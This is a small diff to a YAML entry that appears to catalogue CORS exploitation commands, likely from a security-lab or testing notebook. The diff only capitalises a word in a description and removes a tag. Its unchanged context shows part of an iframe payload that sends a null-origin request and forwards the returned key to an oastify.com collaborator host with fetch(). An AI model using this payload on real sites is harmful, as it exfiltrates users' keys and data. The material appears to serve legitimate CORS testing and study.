@@ -25,10 +25,9 @@ commands:
           fetch('//ceuppgwls7mqp4fxey3bvf93eukl8ew3.oastify.com/log?key='+this.responseText); 
       };
       </script>"></iframe>
-    description: XHR request with null origin.
+    description: XHR request with null Origin.
 tags:
   - authentication
-  - directory-traversal
   - access-control
   - cors
 show:
